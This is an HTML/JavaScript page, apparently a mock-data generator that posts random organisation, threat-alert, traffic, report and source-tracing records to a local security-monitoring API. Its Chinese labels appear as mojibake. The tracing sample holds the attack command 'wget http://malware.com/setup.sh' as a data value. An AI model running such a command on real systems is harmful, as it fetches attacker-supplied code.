<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ğŸ›¡ï¸ ä¸šåŠ¡æ•°æ®æ¨¡æ‹Ÿå‘ç”Ÿå™¨</title>
  <style>
    :root { color-scheme: light dark; --primary: #1890ff; --bg: #f0f2f5; --card-bg: #fff; --text: #333; }
    body { margin: 0; font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }
    
    /* Sidebar */
    aside { width: 240px; background: #001529; color: #fff; display: flex; flex-direction: column; flex-shrink: 0; }
    aside h1 { margin: 0; padding: 20px; font-size: 18px; border-bottom: 1px solid #ffffff1a; display: flex; align-items: center; gap: 8px; }
    .menu { flex: 1; padding: 12px 0; overflow-y: auto; }
    .menu-item { padding: 12px 24px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 10px; opacity: 0.8; }
    .menu-item:hover { opacity: 1; background: #ffffff1a; }
    .menu-item.active { background: var(--primary); opacity: 1; }
    .menu-footer { padding: 16px; border-top: 1px solid #ffffff1a; text-align: center; font-size: 12px; color: #ffffff80; }
    .menu-footer a { color: var(--primary); text-decoration: none; }

    /* Main Content */
    main { flex: 1; display: flex; flex-direction: column; padding: 20px; gap: 20px; overflow-y: auto; }
    
    .card { background: var(--card-bg); border-radius: 8px; padding: 24px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
    .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
    .card-title { font-size: 16px; font-weight: 600; }
    
    .form-grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
    label { font-size: 13px; color: #666; display: block; margin-bottom: 4px; }
    input, textarea, select { width: 100%; padding: 8px 12px; border: 1px solid #d9d9d9; border-radius: 4px; box-sizing: border-box; font-family: inherit; }
    input:focus, textarea:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 2px rgba(24,144,255,0.2); }
    textarea { font-family: monospace; min-height: 200px; line-height: 1.5; }

    .btn-group { display: flex; gap: 12px; margin-top: 20px; }
    button { padding: 8px 16px; border: 1px solid #d9d9d9; border-radius: 4px; background: #fff; cursor: pointer; transition: 0.2s; font-weight: 500; }
    button:hover { color: var(--primary); border-color: var(--primary); }
    button.primary { background: var(--primary); color: white; border-color: var(--primary); }
    button.primary:hover { background: #40a9ff; border-color: #40a9ff; }
    
    .status-bar { margin-top: 16px; padding: 12px; border-radius: 4px; font-size: 13px; display: none; }
    .status-bar.success { background: #f6ffed; border: 1px solid #b7eb8f; color: #52c41a; display: block; }
    .status-bar.error { background: #fff2f0; border: 1px solid #ffccc7; color: #ff4d4f; display: block; }

    pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
  </style>
</head>
<body>

<aside>
  <h1><span>ğŸ²</span> æ•°æ®æ¨¡æ‹Ÿå™¨</h1>
  <div class="menu">
    <div class="menu-item active" onclick="selectType('ORG')">ğŸ¢ ç»„ç»‡ä¿¡æ¯ (Org)</div>
    <div class="menu-item" onclick="selectType('ALERT')">ğŸš¨ å¨èƒå‘Šè­¦ (Alert)</div>
    <div class="menu-item" onclick="selectType('TRAFFIC')">ğŸ“‰ æµé‡ç»Ÿè®¡ (Traffic)</div>
    <div class="menu-item" onclick="selectType('REPORT')">ğŸ“‘ æŠ¥è¡¨é…ç½® (Report)</div>
    <div class="menu-item" onclick="selectType('TRACE')">ğŸ” æº¯æºä¿¡æ¯ (Trace)</div>
  </div>
  <div class="menu-footer">
    Go to <a href="/monitor.html" target="_blank">å®æ—¶ç›‘æ§çœ‹æ¿ &rarr;</a>
  </div>
</aside>

<main>
  <div class="card">
    <div class="card-header">
      <div class="card-title" id="current-title">æ¨¡æ‹Ÿç”Ÿæˆï¼šç»„ç»‡ä¿¡æ¯</div>
      <button onclick="generateData()">ğŸ”„ éšæœºç”Ÿæˆæ•°æ®</button>
    </div>
    
    <div class="form-grid">
      <div>
        <label>ç›®æ ‡æ¥å£ URL</label>
        <div style="display: flex; gap: 8px;">
          <input id="baseUrl" value="http://localhost:8080" style="width: 160px;" placeholder="Base URL">
          <input id="apiUrl" value="/api/chain/org" readonly style="background: #f5f5f5; color: #666;">
        </div>
      </div>
      
      <div>
        <label>è¯·æ±‚ä½“ JSON (å¯æ‰‹åŠ¨ä¿®æ”¹)</label>
        <textarea id="jsonEditor"></textarea>
      </div>
    </div>

    <div class="btn-group">
      <button class="primary" onclick="submitData()" id="submitBtn">ğŸš€ å‘é€ä¸Šé“¾è¯·æ±‚</button>
    </div>

    <div id="statusBox" class="status-bar"></div>
    
    <div id="responseArea" style="display:none; margin-top:16px;">
        <label>åç«¯å“åº”</label>
        <pre id="responsePre" style="background:#f5f5f5; padding:12px; border-radius:4px; font-size:12px;"></pre>
    </div>
  </div>
</main>

<script>
  // åŸºç¡€é…ç½®
  const API_MAP = {
    'ORG': { url: '/api/chain/org', title: 'æ¨¡æ‹Ÿç”Ÿæˆï¼šç»„ç»‡ä¿¡æ¯ (OrgInfo)' },
    'ALERT': { url: '/api/chain/alert', title: 'æ¨¡æ‹Ÿç”Ÿæˆï¼šå¨èƒå‘Šè­¦ (ThreatAlert)' },
    'TRAFFIC': { url: '/api/chain/traffic', title: 'æ¨¡æ‹Ÿç”Ÿæˆï¼šæµé‡ç»Ÿè®¡ (TrafficStat)' },
    'REPORT': { url: '/api/chain/report', title: 'æ¨¡æ‹Ÿç”Ÿæˆï¼šæŠ¥è¡¨é…ç½® (ReportConfig)' },
    'TRACE': { url: '/api/chain/trace', title: 'æ¨¡æ‹Ÿç”Ÿæˆï¼šæº¯æºä¿¡æ¯ (SourceTracing)' }
  };

  let currentType = 'ORG';

  // åˆå§‹åŒ–
  window.onload = () => {
    selectType('ORG');
  };

  function selectType(type) {
    currentType = type;
    
    // æ›´æ–° UI çŠ¶æ€
    document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active'));
    event.currentTarget.classList.add('active'); // æ³¨æ„ï¼šè¿™é‡Œçš„ event ä¾èµ–ç‚¹å‡»è§¦å‘ï¼Œåˆå§‹åŒ–æ—¶å¯èƒ½æŠ¥é”™ï¼Œä¸‹æ–‡ä¿®å¤
    
    // æ›´æ–°æ ‡é¢˜å’Œ URL
    document.getElementById('current-title').textContent = API_MAP[type].title;
    document.getElementById('apiUrl').value = API_MAP[type].url;
    
    // ç”Ÿæˆæ–°æ•°æ®
    generateData();
    
    // æ¸…ç©ºå“åº”åŒº
    document.getElementById('statusBox').className = 'status-bar';
    document.getElementById('responseArea').style.display = 'none';
  }
  
  // ä¿®å¤åˆå§‹åŒ–ç‚¹å‡»é«˜äº®é—®é¢˜
  document.querySelector('.menu-item').click();

  // éšæœºæ•°æ®ç”Ÿæˆå™¨
  function generateData() {
    let data = {};
    const now = new Date();
    const timeStr = now.toISOString().replace('T', ' ').split('.')[0];
    const randomId = Math.floor(Math.random() * 10000);

    if (currentType === 'ORG') {
      data = {
        id: randomId,
        orgId: "ORG_" + Math.floor(Math.random() * 100),
        orgName: ["ç ”å‘éƒ¨", "å¸‚åœºéƒ¨", "è¿ç»´ä¸­å¿ƒ", "å®‰å…¨éƒ¨"][Math.floor(Math.random() * 4)],
        memberCount: Math.floor(Math.random() * 200) + 10,
        adminPermission: Math.random() > 0.5 ? 1 : 0,
        createTime: timeStr,
        updateTime: timeStr
      };
    } else if (currentType === 'ALERT') {
      data = {
        id: randomId,
        threatId: "THREAT-" + Date.now().toString().slice(-6),
        threatLevel: Math.floor(Math.random() * 5) + 1, // 1-5
        impactScope: ["Internal", "External", "DMZ"][Math.floor(Math.random() * 3)],
        occurTime: timeStr,
        createTime: timeStr
      };
    } else if (currentType === 'TRAFFIC') {
      data = {
        id: randomId,
        attackType: ["DDoS", "SQL Injection", "XSS", "Brute Force"][Math.floor(Math.random() * 4)],
        sourceIp: `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        targetIp: `10.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        statTime: timeStr,
        attackCount: Math.floor(Math.random() * 1000),
        createTime: timeStr
      };
    } else if (currentType === 'REPORT') {
      data = {
        id: randomId,
        reportType: ["Daily", "Weekly", "Monthly", "Audit"][Math.floor(Math.random() * 4)],
        startTime: timeStr,
        endTime: timeStr,
        reportStatus: 1,
        reportUrl: "http://oss.example.com/report/" + randomId + ".pdf",
        createTime: timeStr,
        updateTime: timeStr
      };
    } else if (currentType === 'TRACE') {
      data = {
        id: randomId,
        threatSource: ["Unknown", "APT Group", "Insider", "Script Kiddie"][Math.floor(Math.random() * 4)],
        maliciousIp: `203.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        attackCmd: "wget http://malware.com/setup.sh",
        malwareOrigin: "MD5: " + Math.random().toString(36).substring(2),
        attackPath: "/var/www/html/upload",
        flowCharm: "TCP Payload Analysis...",
        createTime: timeStr
      };
    }

    document.getElementById('jsonEditor').value = JSON.stringify(data, null, 4);
  }

  async function submitData() {
    const btn = document.getElementById('submitBtn');
    const statusBox = document.getElementById('statusBox');
    const respArea = document.getElementById('responseArea');
    const respPre = document.getElementById('responsePre');
    const baseUrl = document.getElementById('baseUrl').value;
    const apiUrl = document.getElementById('apiUrl').value;
    
    // UI Loading
    btn.disabled = true;
    btn.textContent = 'â³ å‘é€ä¸­...';
    statusBox.className = 'status-bar';
    respArea.style.display = 'none';

    try {
      const body = document.getElementById('jsonEditor').value;
      // æ ¡éªŒ JSON
      JSON.parse(body);
      
      const fullUrl = baseUrl.replace(/\/$/, '') + apiUrl;
      
      const res = await fetch(fullUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body
      });
      
      const result = await res.json();
      
      respArea.style.display = 'block';
      respPre.textContent = JSON.stringify(result, null, 2);

      if (result.status === 'success' || (result.txId && !result.error)) {
        statusBox.textContent = `âœ… è¯·æ±‚æˆåŠŸ! TxID: ${result.txId || 'N/A'}`;
        statusBox.className = 'status-bar success';
      } else {
        throw new Error(result.message || 'Unknown error');
      }
      
    } catch (e) {
      statusBox.textContent = `âŒ è¯·æ±‚å¤±è´¥: ${e.message}`;
      statusBox.className = 'status-bar error';
      if (e.name === 'SyntaxError') {
        statusBox.textContent = 'âŒ JSON æ ¼å¼é”™è¯¯ï¼Œè¯·æ£€æŸ¥è¾“å…¥';
      }
    } finally {
      btn.disabled = false;
      btn.textContent = 'ğŸš€ å‘é€ä¸Šé“¾è¯·æ±‚';
    }
  }
</script>

</body>
</html>